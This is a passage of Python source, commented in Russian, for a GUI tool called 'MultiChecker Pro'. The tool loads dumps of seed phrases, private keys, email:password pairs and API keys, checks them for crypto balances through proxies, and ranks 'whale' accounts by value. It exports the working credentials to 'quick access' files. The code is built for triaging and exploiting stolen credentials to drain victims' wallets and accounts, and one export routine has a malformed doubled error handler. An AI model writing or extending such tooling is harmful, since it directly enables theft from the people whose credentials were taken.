        export_buttons.append(btn_key)
        
        # Кнопка экспорта аккаунтов с возможностью авторизации
        btn_auth = ctk.CTkButton(eg, text="🔐 AUTH", fg_color="transparent",
                       hover_color=HOVER, font=("Segoe UI", 11, "bold"),
                       text_color="#3fb950", corner_radius=6, height=30, width=64,
                       command=lambda: self.export_auth_accounts(w))
        btn_auth.pack(side="left", padx=2, pady=4)
        export_buttons.append(btn_auth)
        
        # Добавляем tooltips для кнопок экспорта
        create_tooltip(export_buttons[0], "Экспорт результатов в TXT файл")
        create_tooltip(export_buttons[1], "Экспорт результатов в JSON файл")
        create_tooltip(export_buttons[2], "Экспорт результатов в CSV файл")
        create_tooltip(export_buttons[3], "Экспорт результатов в Excel файл")
        create_tooltip(export_buttons[4], "Экспорт только аккаунтов с балансом")
        create_tooltip(export_buttons[5], "Экспорт только seed фраз")
        create_tooltip(export_buttons[6], "Экспорт только приватных ключей")
        create_tooltip(export_buttons[7], "Экспорт аккаунтов с auth данными (seed/privkey/email:pass)")

        btn_stats = btn(bf, "◈  Стат", PURPLE, "#a371f7",
            lambda: self.show_stats(tab_name), 110)
        btn_stats.pack(side="right", padx=(0, 6))
        create_tooltip(btn_stats, "Показать детальную статистику проверки")
        
        # Дополнительные кнопки для Crypto чекера
        if tab_name == "Crypto":
            # DeFi Positions
            btn_defi = btn(bf, "📊 DEFI", "#10b981", "#34d399",
                lambda: self.check_defi_positions(w), 110)
            btn_defi.pack(side="right", padx=(0, 6))
            create_tooltip(btn_defi, "Проверить DeFi позиции (Lido, Aave, Uniswap)")
            
            # Airdrop Hunter
            btn_airdrop = btn(bf, "🪂 AIRDROP", "#8b5cf6", "#a78bfa",
                lambda: self.check_airdrops(w), 130)
            btn_airdrop.pack(side="right", padx=(0, 6))
            create_tooltip(btn_airdrop, "Проверить eligibility для аирдропов")
            
            # NFT Checker
            btn_nft = btn(bf, "🖼️ NFT", "#ec4899", "#f472b6",
                lambda: self.check_nfts(w), 110)
            btn_nft.pack(side="right", padx=(0, 6))
            create_tooltip(btn_nft, "Проверить NFT коллекции и их стоимость")
            
            # Ultimate Finder
            btn_ultimate = btn(bf, "🎯 ULTIMATE", "#d29922", "#b8821e",
                lambda: self.find_ultimate_accounts(w), 130)
            btn_ultimate.pack(side="right", padx=(0, 6))
            create_tooltip(btn_ultimate, "Найти аккаунты с seed/privkey И балансом")

        cr = ctk.CTkFrame(body, fg_color="transparent")
        cr.grid(row=5 if tab_name == "Crypto" else 3, column=0, padx=16, pady=6, sticky="ew")
        cr.grid_columnconfigure((0,1,2,3), weight=1)

        def counter(parent, col, title, color):
            c = ctk.CTkFrame(parent, fg_color=CARD, corner_radius=12)
            c.grid(row=0, column=col, padx=4, sticky="ew")
            ctk.CTkLabel(c, text=title, font=("Segoe UI", 10),
                         text_color=MUTED).pack(pady=(10, 0))
            v = ctk.CTkLabel(c, text="0", font=("Segoe UI", 26, "bold"),
                              text_color=color)
            v.pack()
            ctk.CTkFrame(c, height=3, fg_color=color, corner_radius=2
                         ).pack(fill="x", padx=16, pady=(4, 10))
            return v

        w["cnt_valid"]   = counter(cr, 0, "Валидных",   GREEN)
        w["cnt_invalid"] = counter(cr, 1, "Невалидных", RED)
        w["cnt_errors"]  = counter(cr, 2, "Ошибок",     YELLOW)
        w["cnt_total"]   = counter(cr, 3, "Всего",      ACCENT)

        pc = ctk.CTkFrame(body, fg_color=CARD, corner_radius=10)
        pc.grid(row=6 if tab_name == "Crypto" else 4, column=0, padx=16, pady=6, sticky="ew")
        pc.grid_columnconfigure(0, weight=1)
        
        # Точный прогресс-индикатор (Проценты + Количественный счётчик строк)
        w["progress"] = ctk.CTkProgressBar(pc, height=8, corner_radius=4,
                                            progress_color=ACCENT, fg_color=BORDER)
        w["progress"].grid(row=0, column=0, padx=(14, 120), pady=12, sticky="ew")
        w["progress"].set(0)
        
        w["progress_lbl"] = ctk.CTkLabel(pc, text="0% (0/0)", font=("Segoe UI", 11, "bold"), text_color=ACCENT)
        w["progress_lbl"].grid(row=0, column=0, padx=14, pady=12, sticky="e")

        ff = ctk.CTkFrame(body, fg_color="transparent")
        ff.grid(row=7 if tab_name == "Crypto" else 5, column=0, padx=16, pady=(4, 0), sticky="ew")
        w["_log_lines"] = []
        w["_filter"]    = "all"
        w["filter_seg"] = ctk.CTkSegmentedButton(
            ff,
            values=[i18n.t("filter_all"), i18n.t("filter_valid"),
                    i18n.t("filter_invalid"), i18n.t("filter_errors"),
                    i18n.t("filter_balance")],
            font=("Segoe UI", 12),
            selected_color=ACCENT, selected_hover_color="#4393e4",
            unselected_color=CARD, unselected_hover_color=HOVER,
            fg_color=CARD, text_color=TEXT,
            command=lambda v: self._on_filter(w, v),
        )
        w["filter_seg"].set(i18n.t("filter_all"))
        w["filter_seg"].pack(side="left")

        lc = ctk.CTkFrame(body, fg_color=CARD, corner_radius=10)
        lc.grid(row=8 if tab_name == "Crypto" else 6, column=0, padx=16, pady=(6, 18), sticky="ew")
        lc.grid_columnconfigure(0, weight=1)
        w["output"] = ctk.CTkTextbox(
            lc, height=300, font=("Consolas", 12),
            fg_color="#0d1117", border_color=BORDER, border_width=1,
            text_color=TEXT, corner_radius=8, wrap="none",
        )
        w["output"].grid(row=0, column=0, padx=12, pady=12, sticky="ew")
        
        # Стандартные теги
        w["output"].tag_config("valid",   foreground=GREEN)
        w["output"].tag_config("invalid", foreground=MUTED)
        w["output"].tag_config("error",   foreground=YELLOW)
        w["output"].tag_config("system",  foreground=ACCENT)
        
        # v1.0.57: Новые цветовые теги для улучшенного отображения
        LogColorizer.setup_textbox_tags(w["output"])

        w["status"] = w["pill"]
        return w

    def _card(self, parent, title=""):
        f = ctk.CTkFrame(parent, fg_color=CARD, corner_radius=10)
        if title:
            ctk.CTkLabel(f, text=title, font=("Segoe UI", 10),
                         text_color=MUTED).grid(row=0, column=0, padx=14,
                                                pady=(10, 2), sticky="w")
        return f
    
    def _bind_paste_shortcut(self, widget):
        """Добавляет поддержку Ctrl+V для вставки из буфера обмена."""
        def paste_from_clipboard(event=None):
            try:
                # Получаем содержимое буфера обмена
                clipboard_content = self.clipboard_get()
                
                if isinstance(widget, ctk.CTkTextbox):
                    # Для Textbox вставляем в текущую позицию курсора
                    try:
                        widget.insert("insert", clipboard_content)
                    except:
                        # Если не получилось вставить в позицию курсора, добавляем в конец
                        widget.insert("end", clipboard_content)
                elif isinstance(widget, ctk.CTkEntry):
                    # Для Entry заменяем весь текст
                    widget.delete(0, "end")
                    widget.insert(0, clipboard_content)
                
                return "break"  # Предотвращаем стандартное поведение
            except Exception as e:
                print(f"Ошибка вставки из буфера: {e}")
                return "break"
        
        # Получаем внутренний tkinter виджет для биндинга
        try:
            if isinstance(widget, ctk.CTkTextbox):
                # Для CTkTextbox внутренний виджет - _textbox
                tk_widget = widget._textbox
            elif isinstance(widget, ctk.CTkEntry):
                # Для CTkEntry внутренний виджет - _entry
                tk_widget = widget._entry
            else:
                tk_widget = widget
            
            # Биндим Ctrl+V (Windows/Linux) и Cmd+V (Mac) к внутреннему виджету
            tk_widget.bind("<Control-v>", paste_from_clipboard)
            tk_widget.bind("<Command-v>", paste_from_clipboard)
            
            # Также биндим к самому CTk виджету на всякий случай
            widget.bind("<Control-v>", paste_from_clipboard)
            widget.bind("<Command-v>", paste_from_clipboard)
            
        except Exception as e:
            print(f"⚠️ Ошибка биндинга Ctrl+V: {e}")
            # Пробуем забиндить напрямую к виджету
            widget.bind("<Control-v>", paste_from_clipboard)
            widget.bind("<Command-v>", paste_from_clipboard)
        
        # Также биндим правую кнопку мыши для контекстного меню
        if isinstance(widget, ctk.CTkEntry):
            def show_context_menu(event):
                try:
                    menu = ctk.CTkToplevel(self)
                    menu.withdraw()
                    menu.overrideredirect(True)
                    
                    frame = ctk.CTkFrame(menu, fg_color=CARD, corner_radius=8)
                    frame.pack(padx=2, pady=2)
                    
                    ctk.CTkButton(frame, text="📋 Вставить (Ctrl+V)", 
                                  command=lambda: [paste_from_clipboard(), menu.destroy()],
                                  fg_color="transparent", hover_color=HOVER,
                                  anchor="w", height=28, font=("Segoe UI", 11)
                                  ).pack(fill="x", padx=4, pady=2)
                    
                    menu.geometry(f"+{event.x_root}+{event.y_root}")
                    menu.deiconify()
                    menu.focus_set()
                    menu.bind("<FocusOut>", lambda e: menu.destroy())
                except Exception:
                    pass
            
            try:
                # Биндим к внутреннему виджету
                tk_widget.bind("<Button-3>", show_context_menu)
            except:
                widget.bind("<Button-3>", show_context_menu)
            
            widget.bind("<Button-3>", show_context_menu)
    
    def _setup_drag_and_drop(self, textbox):
        """Настраивает drag-and-drop для текстового поля."""
        if not DRAG_DROP_AVAILABLE:
            return
        
        def on_drop(event):
            try:
                # Получаем путь к файлу (может быть в фигурных скобках на Windows)
                file_path = event.data
                
                # Убираем фигурные скобки если есть
                if file_path.startswith('{') and file_path.endswith('}'):
                    file_path = file_path[1:-1]
                
                # Проверяем что это файл
                if os.path.isfile(file_path):
                    # Читаем содержимое файла
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                        
                        # Очищаем текстбокс и вставляем содержимое
                        textbox.delete("1.0", "end")
                        textbox.insert("1.0", content)
                        
                        # Логируем успех
                        print(f"✓ Файл загружен: {os.path.basename(file_path)}")
                    except UnicodeDecodeError:
                        # Пробуем другие кодировки
                        try:
                            with open(file_path, 'r', encoding='cp1251') as f:
                                content = f.read()
                            textbox.delete("1.0", "end")
                            textbox.insert("1.0", content)
                            print(f"✓ Файл загружен (cp1251): {os.path.basename(file_path)}")
                        except Exception as e:
                            print(f"✗ Ошибка чтения файла: {e}")
                    except Exception as e:
                        print(f"✗ Ошибка загрузки файла: {e}")
                else:
                    print(f"✗ Не является файлом: {file_path}")
                    
            except Exception as e:
                print(f"✗ Ошибка drag-and-drop: {e}")
        
        # Регистрируем drag-and-drop
        try:
            # Получаем внутренний tkinter виджет
            tk_textbox = textbox._textbox
            tk_textbox.drop_target_register(DND_FILES)
            tk_textbox.dnd_bind('<<Drop>>', on_drop)
        except Exception as e:
            print(f"⚠️ Не удалось настроить drag-and-drop: {e}")

    def toggle_lang(self):
        i18n.set_lang("en" if i18n.current_lang == "ru" else "ru")
        self._refresh_text()

    def _toggle_theme(self):
        if self.theme_sw.get():
            ctk.set_appearance_mode("light")
        else:
            ctk.set_appearance_mode("dark")

    def _get_config_path(self):
        return os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")

    def _load_config(self):
        config_path = self._get_config_path()
        if not os.path.isfile(config_path):
            return
        try:
            with open(config_path, "r", encoding="utf-8") as f:
                cfg = json.load(f)
        except Exception:
            return

        theme = cfg.get("theme", "dark")
        ctk.set_appearance_mode(theme)
        if theme == "light":
            self.theme_sw.select()
        else:
            self.theme_sw.deselect()

        lang = cfg.get("lang", "ru")
        if lang != i18n.current_lang:
            i18n.set_lang(lang)
            self._refresh_text()
        if lang == "ru":
            self.lang_sw.select()
        else:
            self.lang_sw.deselect()

        for tab_name, w in self.tab_widgets.items():
            threads = cfg.get("threads", "100")
            w["threads"].delete(0, "end")
            w["threads"].insert(0, str(threads))

            timeout = cfg.get("timeout", "10")
            w["timeout"].delete(0, "end")
            w["timeout"].insert(0, str(timeout))

            proxy = cfg.get("proxy", "")
            if proxy:
                w["proxy"].delete(0, "end")
                w["proxy"].insert(0, proxy)

            tg_token = cfg.get("tg_token", "")
            tg_chat_id = cfg.get("tg_chat_id", "")
            if tg_token:
                w["tg_token"].delete(0, "end")
                w["tg_token"].insert(0, tg_token)
            if tg_chat_id:
                w["tg_chat_id"].delete(0, "end")
                w["tg_chat_id"].insert(0, tg_chat_id)

    def _save_config(self):
        config_path = self._get_config_path()
        first_tab = list(self.tab_widgets.keys())[0]
        w = self.tab_widgets[first_tab]

        cfg = {
            "theme": "light" if self.theme_sw.get() else "dark",
            "lang": i18n.current_lang,
            "threads": w["threads"].get().strip(),
            "timeout": w["timeout"].get().strip(),
            "proxy": w["proxy"].get().strip(),
            "tg_token": w["tg_token"].get().strip(),
            "tg_chat_id": w["tg_chat_id"].get().strip(),
        }

        try:
            with open(config_path, "w", encoding="utf-8") as f:
                json.dump(cfg, f, indent=2, ensure_ascii=False)
        except Exception:
            pass

    def _on_close(self):
        self._save_config()
        self.destroy()

    def _refresh_text(self):
        self.title(f"MultiChecker Pro  v{APP_VERSION}")
        fl = [i18n.t("filter_all"), i18n.t("filter_valid"),
              i18n.t("filter_invalid"), i18n.t("filter_errors"),
              i18n.t("filter_balance")]
        fk = ["all", "valid", "invalid", "error", "balance"]
        for tab_name, w in self.tab_widgets.items():
            w["pill"].configure(text=f"● {i18n.t('ready')}")
            w["filter_seg"].configure(values=fl)
            cur = w.get("_filter", "all")
            w["filter_seg"].set(fl[fk.index(cur) if cur in fk else 0])

    def import_file(self, w):
        path = filedialog.askopenfilename(
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if not path:
            return
        try:
            tab = self._tab_of(w)
            lines = []
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                while True:
                    chunk = f.readlines(1_000_000)
                    if not chunk:
                        break
                    lines.extend(l.strip() for l in chunk if l.strip())
            total = len(lines)
            self._loaded_data[tab] = lines
            w["input"].delete("1.0", "end")
            if total <= _TEXTBOX_DISPLAY_LIMIT:
                w["input"].insert("1.0", "\n".join(lines))
            else:
                w["input"].insert("1.0",
                    "\n".join(lines[:_TEXTBOX_DISPLAY_LIMIT]) +
                    f"\n\n... [{total - _TEXTBOX_DISPLAY_LIMIT} строк ещё] ...")
            self.log(w, i18n.t("file_loaded").format(total))
        except Exception as e:
            self.log(w, f"Import error: {e}")
    
    def _browse_proxy_file(self, w):
        """Выбор файла с прокси через диалог"""
        path = filedialog.askopenfilename(
            title="Выберите файл с прокси",
            filetypes=[
                ("Proxy files", "*.txt *.list *.proxy *.proxies"),
                ("Text files", "*.txt"),
                ("All files", "*.*")
            ]
        )
        if path:
            # Вставляем путь к файлу в поле прокси
            w["proxy"].delete(0, "end")
            w["proxy"].insert(0, path)
            self.log(w, f"✅ Выбран файл прокси: {path}")

    def _paste_clipboard(self, w):
        try:
            text = self.clipboard_get()
            if text.strip():
                w["input"].delete("1.0", "end")
                w["input"].insert("1.0", text)
                lines = [l.strip() for l in text.split("\n") if l.strip()]
                tab = self._tab_of(w)
                self._loaded_data[tab] = lines
                self.log(w, f"Clipboard: {len(lines)} lines pasted")
        except Exception:
            pass

    def export_results(self, w, fmt="txt"):
        if not self.results:
            self.log(w, i18n.t("no_results"))
            return
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn = f"valid_{ts}.{fmt}"
        try:
            if fmt == "json":
                with open(fn, "w", encoding="utf-8") as f:
                    json.dump(self.results, f, indent=2, ensure_ascii=False)
            elif fmt == "csv":
                with open(fn, "w", newline="", encoding="utf-8") as f:
                    wr = csv.DictWriter(f, fieldnames=self.results[0].keys())
                    wr.writeheader()
                    for r in self.results:
                        wr.writerow({k: json.dumps(v, ensure_ascii=False)
                                     if isinstance(v, dict) else v
                                     for k, v in r.items()})
            elif fmt == "xlsx":
                # Excel экспорт - НОВОЕ в v1.0.52
                from checkers.crypto_extensions import export_to_excel
                result_msg = export_to_excel(self.results, fn)
                self.log(w, result_msg)
                return
            else:
                with open(fn, "w", encoding="utf-8") as f:
                    for r in self.results:
                        f.write(json.dumps(r, ensure_ascii=False) + "\n")
            self.log(w, i18n.t("exported").format(fn))
        except Exception as e:
            self.log(w, f"Export error: {e}")

    def export_balance_only(self, w):
        balance_results = []
        for r in self.all_results:
            if not r:
                continue
            info = r.get("info", {})
            has_balance = False
            for key, val in info.items():
                if key.startswith("balance_") and isinstance(val, (int, float)) and val > 0:
                    has_balance = True
                    break
            if not has_balance and "balances" in info:
                for coin_data in info["balances"].values():
                    if isinstance(coin_data, dict) and coin_data.get("balance", 0) > 0:
                        has_balance = True
                        break
            if not has_balance and info.get("total_usd", 0) > 0:
                has_balance = True
            if not has_balance and "chains" in info:
                for chain_data in info["chains"].values():
                    if isinstance(chain_data, dict) and chain_data.get("balance", 0) > 0:
                        has_balance = True
                        break
            if has_balance:
                balance_results.append(r)

        if not balance_results:
            self.log(w, i18n.t("no_balance_results"))
            return

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn = f"balance_{ts}.json"
        try:
            with open(fn, "w", encoding="utf-8") as f:
                json.dump(balance_results, f, indent=2, ensure_ascii=False)
            self.log(w, i18n.t("exported_balance").format(len(balance_results), fn))
        except Exception as e:
            self.log(w, f"Export error: {e}")

    def export_by_type(self, w, rtype_filter):
        filtered = []
        for r in self.all_results:
            if not r:
                continue
            curr_type = r.get("type", "")
            if rtype_filter == "seed" and curr_type == "seed":
                filtered.append(r)
            elif rtype_filter == "privkey" and curr_type in ("privkey_hex", "privkey_wif"):
                filtered.append(r)

        if not filtered:
            self.log(w, f"Экспорт отменён: данные по типу '{rtype_filter}' не найдены.")
            return

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn = f"manual_{rtype_filter}_{ts}.txt"
        try:
            with open(fn, "w", encoding="utf-8") as f:
                for r in filtered:
                    inp = r.get("input", "")
                    msg = r.get("info", {}).get("message", "")
                    f.write(f"{inp} | {msg}\n")
            self.log(w, i18n.t("exported").format(fn))
        except Exception as e:
            self.log(w, f"Export error: {e}")
    
    def export_auth_accounts(self, w):
        """Экспорт аккаунтов с возможностью авторизации (seed/privkey + баланс)"""
        from checkers.auth_export import ResultsAnalyzer
        
        # Анализируем результаты
        analyzer = ResultsAnalyzer()
        exporter = analyzer.analyze_results(self.all_results)
        
        stats = exporter.get_statistics()
        total_auth = stats["total_accounts"]
        with_balance = stats["with_balance"]
        total_balance = stats["total_balance_usd"]
        
        if total_auth == 0:
            self.log(w, "❌ Аккаунты с возможностью авторизации не найдены.")
            self.log(w, "   Нужны: seed фраза, приватный ключ, email:password или API ключи")
            return
        
        # Показываем статистику
        self.log(w, f"🔐 Найдено аккаунтов с авторизацией: {total_auth}")
        self.log(w, f"   💰 С балансом: {with_balance}")
        self.log(w, f"   💵 Общий баланс: ${total_balance:,.2f}")
        
        # Экспортируем в разные форматы
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        try:
            # 1. Детальный TXT (все аккаунты)
            fn_detailed = f"auth_accounts_detailed_{ts}.txt"
            exporter.export_to_txt(fn_detailed, min_balance=0.0, format_type="detailed")
            self.log(w, f"✅ Детальный отчет: {fn_detailed}")
            
            # 2. Компактный TXT (только с балансом)
            if with_balance > 0:
                fn_compact = f"auth_accounts_balance_{ts}.txt"
                exporter.export_to_txt(fn_compact, min_balance=0.01, format_type="compact")
                self.log(w, f"✅ С балансом: {fn_compact}")
            
            # 3. Только credentials (для быстрого импорта)
            fn_creds = f"auth_credentials_only_{ts}.txt"
            exporter.export_to_txt(fn_creds, min_balance=0.0, format_type="credentials_only")
            self.log(w, f"✅ Только credentials: {fn_creds}")
            
            # 4. JSON (полные данные)
            fn_json = f"auth_accounts_{ts}.json"
            exporter.export_to_json(fn_json, min_balance=0.0, include_credentials=True)
            self.log(w, f"✅ JSON: {fn_json}")
            
            # 5. CSV (для Excel)
            fn_csv = f"auth_accounts_{ts}.csv"
            exporter.export_to_csv(fn_csv, min_balance=0.0)
            self.log(w, f"✅ CSV: {fn_csv}")
            
            # Показываем отчет
            self.log(w, "\n" + "="*50)
            self.log(w, "📊 СТАТИСТИКА ПО ТИПАМ АВТОРИЗАЦИИ:")
            
            by_type = stats.get("by_auth_type", {})
            for auth_type, data in sorted(by_type.items(), key=lambda x: x[1]["total_balance"], reverse=True):
                count = data["count"]
                balance = data["total_balance"]
                self.log(w, f"   • {auth_type}: {count} шт. (${balance:,.2f})")
            
            self.log(w, "="*50)
        
        except Exception as e:
            self.log(w, f"❌ Ошибка экспорта: {e}")
    
    def find_ultimate_accounts(self, w):
        """Найти аккаунты с seed/privkey И балансом (Ultimate Finder)"""
        if not self.all_results:
            self.log(w, "❌ Нет результатов для поиска!")
            self.log(w, "   Сначала запустите проверку аккаунтов")
            return
        
        self.log(w, "\n" + "="*70)
        self.log(w, "🎯 ULTIMATE ACCOUNT FINDER - ПОИСК ЦЕННЫХ АККАУНТОВ")
        self.log(w, "="*70)
        self.log(w, "🔍 Сканирование результатов...")
        
        # Создаем finder
        finder = UltimateAccountFinder()
        
        # Фильтруем только валидные результаты с балансом
        accounts_with_balance = []
        accounts_with_auth = []
        
        for result in self.all_results:
            if result.get("status") != "valid":
                continue
            
            info = result.get("info", {})
            
            # Проверяем наличие баланса
            has_balance = False
            balance_usd = 0.0
            
            if "balance_usd" in info and info["balance_usd"] > 0:
                has_balance = True
                balance_usd = info["balance_usd"]
            elif "total_balance_usd" in info and info["total_balance_usd"] > 0:
                has_balance = True
                balance_usd = info["total_balance_usd"]
            
            # Проверяем наличие auth данных
            has_auth = False
            auth_type = None
            auth_data = None
            
            # Seed фраза
            if "seed" in info or "seed_phrase" in info or "mnemonic" in info:
                has_auth = True
                auth_type = "seed"
                auth_data = info.get("seed") or info.get("seed_phrase") or info.get("mnemonic")
            
            # Приватный ключ
            elif "private_key" in info or "privkey" in info:
                has_auth = True
                auth_type = "privkey"
                auth_data = info.get("private_key") or info.get("privkey")
            
            # Email:Password
            elif "email" in info and "password" in info:
                has_auth = True
                auth_type = "email_password"
                auth_data = f"{info['email']}:{info['password']}"
            
            # API ключи
            elif "api_key" in info or "api_secret" in info:
                has_auth = True
                auth_type = "api_key"
                auth_data = info.get("api_key", "")
            
            if has_auth:
                accounts_with_auth.append({
                    "result": result,
                    "auth_type": auth_type,
                    "auth_data": auth_data,
                    "balance_usd": balance_usd,
                    "has_balance": has_balance,
                })
            
            if has_balance and has_auth:
                accounts_with_balance.append({
                    "result": result,
                    "auth_type": auth_type,
                    "auth_data": auth_data,
                    "balance_usd": balance_usd,
                })
        
        # Статистика
        total_checked = len(self.all_results)
        total_with_auth = len(accounts_with_auth)
        total_with_balance_and_auth = len(accounts_with_balance)
        
        # Сортируем по балансу
        accounts_with_balance.sort(key=lambda x: x["balance_usd"], reverse=True)
        
        # Категории
        whales = [acc for acc in accounts_with_balance if acc["balance_usd"] >= 10000]
        high_value = [acc for acc in accounts_with_balance if 100 <= acc["balance_usd"] < 10000]
        medium_value = [acc for acc in accounts_with_balance if 10 <= acc["balance_usd"] < 100]
        low_value = [acc for acc in accounts_with_balance if acc["balance_usd"] < 10]
        
        total_value = sum(acc["balance_usd"] for acc in accounts_with_balance)
        
        # Выводим статистику
        self.log(w, f"\n📊 СТАТИСТИКА:")
        self.log(w, f"   Всего проверено: {total_checked}")
        self.log(w, f"   С auth данными: {total_with_auth}")
        self.log(w, f"   С auth И балансом: {total_with_balance_and_auth}")
        self.log(w, f"   💎 Whales (>$10k): {len(whales)}")
        self.log(w, f"   💰 High Value ($100-$10k): {len(high_value)}")
        self.log(w, f"   💵 Medium Value ($10-$100): {len(medium_value)}")
        self.log(w, f"   💸 Low Value (<$10): {len(low_value)}")
        self.log(w, f"   💲 Общая стоимость: ${total_value:,.2f}")
        
        if total_with_balance_and_auth == 0:
            self.log(w, "\n❌ Аккаунты с балансом И auth данными не найдены!")
            self.log(w, "="*70)
            return
        
        # Экспортируем результаты
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        try:
            # 1. Детальный отчет
            fn_detailed = f"ultimate_accounts_detailed_{ts}.txt"
            with open(fn_detailed, "w", encoding="utf-8") as f:
                f.write("="*70 + "\n")
                f.write("🎯 ULTIMATE ACCOUNT FINDER - ДЕТАЛЬНЫЙ ОТЧЕТ\n")
                f.write("="*70 + "\n\n")
                
                f.write(f"📊 СТАТИСТИКА:\n")
                f.write(f"   Всего проверено: {total_checked}\n")
                f.write(f"   С auth данными: {total_with_auth}\n")
                f.write(f"   С auth И балансом: {total_with_balance_and_auth}\n")
                f.write(f"   💎 Whales: {len(whales)}\n")
                f.write(f"   💰 High Value: {len(high_value)}\n")
                f.write(f"   💵 Medium Value: {len(medium_value)}\n")
                f.write(f"   💸 Low Value: {len(low_value)}\n")
                f.write(f"   💲 Общая стоимость: ${total_value:,.2f}\n\n")
                
                # Whales
                if whales:
                    f.write("="*70 + "\n")
                    f.write("💎 WHALE АККАУНТЫ (>$10,000)\n")
                    f.write("="*70 + "\n\n")
                    for i, acc in enumerate(whales, 1):
                        f.write(f"#{i} | ${acc['balance_usd']:,.2f} | {acc['auth_type']}\n")
                        f.write(f"   Input: {acc['result']['input']}\n")
                        f.write(f"   Auth: {acc['auth_data'][:100]}...\n\n")
                
                # High Value
                if high_value:
                    f.write("="*70 + "\n")
                    f.write("💰 HIGH VALUE АККАУНТЫ ($100-$10,000)\n")
                    f.write("="*70 + "\n\n")
                    for i, acc in enumerate(high_value, 1):
                        f.write(f"#{i} | ${acc['balance_usd']:,.2f} | {acc['auth_type']}\n")
                        f.write(f"   Input: {acc['result']['input']}\n")
                        f.write(f"   Auth: {acc['auth_data'][:100]}...\n\n")
                
                # Medium Value
                if medium_value:
                    f.write("="*70 + "\n")
                    f.write("💵 MEDIUM VALUE АККАУНТЫ ($10-$100)\n")
                    f.write("="*70 + "\n\n")
                    for i, acc in enumerate(medium_value, 1):
                        f.write(f"#{i} | ${acc['balance_usd']:,.2f} | {acc['auth_type']}\n")
                        f.write(f"   Input: {acc['result']['input']}\n")
                        f.write(f"   Auth: {acc['auth_data'][:100]}...\n\n")
            
            self.log(w, f"\n✅ Детальный отчет: {fn_detailed}")
            
            # 2. Быстрый доступ (только credentials)
            fn_quick = f"ultimate_accounts_quick_{ts}.txt"
            with open(fn_quick, "w", encoding="utf-8") as f:
                f.write("🎯 ULTIMATE FINDER - БЫСТРЫЙ ДОСТУП\n")
                f.write("="*70 + "\n\n")
                
                for i, acc in enumerate(accounts_with_balance, 1):
                    f.write(f"{i}. {acc['auth_type'].upper()} | ${acc['balance_usd']:,.2f}\n")
                    f.write(f"   {acc['auth_data']}\n\n")
            
            self.log(w, f"✅ Быстрый доступ: {fn_quick}")
            
            # 3. JSON
            fn_json = f"ultimate_accounts_{ts}.json"
            import json
            with open(fn_json, "w", encoding="utf-8") as f:
                json.dump({
                    "statistics": {
                        "total_checked": total_checked,
                        "with_auth": total_with_auth,
                        "with_balance_and_auth": total_with_balance_and_auth,
                        "whales": len(whales),
                        "high_value": len(high_value),
                        "medium_value": len(medium_value),
                        "low_value": len(low_value),
                        "total_value_usd": total_value,
                    },
                    "accounts": [
                        {
                            "input": acc["result"]["input"],
                            "auth_type": acc["auth_type"],
                            "auth_data": acc["auth_data"],
                            "balance_usd": acc["balance_usd"],
                            "info": acc["result"].get("info", {}),
                        }
                        for acc in accounts_with_balance
                    ]
                }, f, indent=2, ensure_ascii=False)
            
            self.log(w, f"✅ JSON: {fn_json}")
            
            # Показываем топ-10
            self.log(w, "\n" + "="*70)
            self.log(w, "🏆 ТОП-10 НАХОДОК:")
            self.log(w, "="*70)
            
            for i, acc in enumerate(accounts_with_balance[:10], 1):
                category = "💎 WHALE" if acc["balance_usd"] >= 10000 else "💰 HIGH" if acc["balance_usd"] >= 100 else "💵 MED"
                self.log(w, f"{i}. {category} | ${acc['balance_usd']:,.2f} | {acc['auth_type']}")
                self.log(w, f"   {acc['result']['input'][:60]}...")
            
            self.log(w, "="*70)
            self.log(w, "✅ Ultimate Finder завершен!")
            
        except Exception as e:
            self.log(w, f"❌ Ошибка экспорта: {e}")
            import traceback
            traceback.print_exc()
            self.log(w, f"✅ Экспорт завершен! Создано 5 файлов.")
            
        except Exception as e:
            self.log(w, f"❌ Ошибка экспорта: {e}")

    def remove_duplicates(self, w):
        tab = self._tab_of(w)
        if tab in self._loaded_data and self._loaded_data[tab]:
            raw = self._loaded_data[tab]
        else:
            txt = w["input"].get("1.0", "end").strip()
            if not txt:
                self.log(w, i18n.t("no_data_to_dedup"))
                return
            raw = [l.strip() for l in txt.split("\n") if l.strip()]
        orig = len(raw)
        seen, uniq = set(), []
        for line in raw:
            if line not in seen:
                seen.add(line); uniq.append(line)
        del seen
        dupes = orig - len(uniq)
        if dupes:
            self._loaded_data[tab] = uniq
            w["input"].delete("1.0", "end")
            total = len(uniq)
            if total <= _TEXTBOX_DISPLAY_LIMIT:
                w["input"].insert("1.0", "\n".join(uniq))
            else:
                w["input"].insert("1.0",
                    "\n".join(uniq[:_TEXTBOX_DISPLAY_LIMIT]) +
                    f"\n\n... [{total - _TEXTBOX_DISPLAY_LIMIT} строк ещё] ...")
            self.log(w, i18n.t("dedup_result").format(dupes, len(uniq)))
        else:
            self.log(w, i18n.t("dedup_no_dupes").format(orig))
    
    def parse_dump(self, w):
        """Парсит дамп и извлекает данные для проверки"""
        txt = w["input"].get("1.0", "end").strip()
        if not txt:
            self.log(w, "❌ Нет данных для парсинга")
            return
        
        self.log(w, "🔄 Парсинг дампа...")
        
        try:
            parser = DumpParser()
            parsed_data = parser.parse_dump(txt)
            
            if not parsed_data:
                self.log(w, "❌ Не удалось распарсить данные")
                return
            
            # Извлекаем данные для чекера
            for_checker = parser.extract_for_checker(parsed_data)
            
            if not for_checker:
                self.log(w, "❌ Не найдено данных для проверки (seed/privkey/address)")
                return
            
            # Обновляем поле ввода
            tab = self._tab_of(w)
            self._loaded_data[tab] = for_checker
            w["input"].delete("1.0", "end")
            
            total = len(for_checker)
            if total <= _TEXTBOX_DISPLAY_LIMIT:
                w["input"].insert("1.0", "\n".join(for_checker))
            else:
                w["input"].insert("1.0",
                    "\n".join(for_checker[:_TEXTBOX_DISPLAY_LIMIT]) +
                    f"\n\n... [{total - _TEXTBOX_DISPLAY_LIMIT} строк ещё] ...")
            
            # Показываем статистику
            stats = parser.get_stats()
            self.log(w, "✅ Дамп распарсен успешно!")
            self.log(w, f"📊 Всего строк: {stats['total_lines']}")
